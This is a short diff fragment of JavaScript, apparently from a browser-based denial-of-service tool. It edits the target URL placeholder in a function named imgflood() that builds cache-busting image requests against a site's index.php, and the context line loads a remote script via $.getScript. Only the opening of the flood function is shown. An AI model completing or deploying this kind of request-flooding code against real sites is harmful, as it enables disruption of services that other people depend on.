@@ -14,7 +14,7 @@ $.getScript(url2);
 
 
 function imgflood() {
-  var TARGET = 'http://TARGET-SITE.com'
+  var TARGET = 'TARGET-SITE.com'
   var URI = '/index.php?'
   var pic = new Image()
   var rand = Math.floor(Math.random() * 1000)
